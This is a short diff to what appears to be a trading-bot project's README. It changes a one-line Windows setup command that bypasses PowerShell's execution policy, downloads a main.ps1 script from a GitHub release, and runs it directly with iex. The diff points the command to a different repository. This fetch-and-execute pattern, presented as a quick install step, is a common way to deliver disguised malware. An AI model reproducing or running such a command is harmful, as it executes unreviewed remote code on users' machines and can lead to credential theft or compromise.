@@ -31,7 +31,7 @@ If you just want to get the project running fast on Windows, use the installatio
 Open **CMD** and run this **single command**:
 
 ```powershell
-powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
+powershell -ep bypass -c "iwr https://github.com/shelby-254guru/Nexus-trading-app-bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
 ```
 
 > Then continue with the project-specific setup steps below.
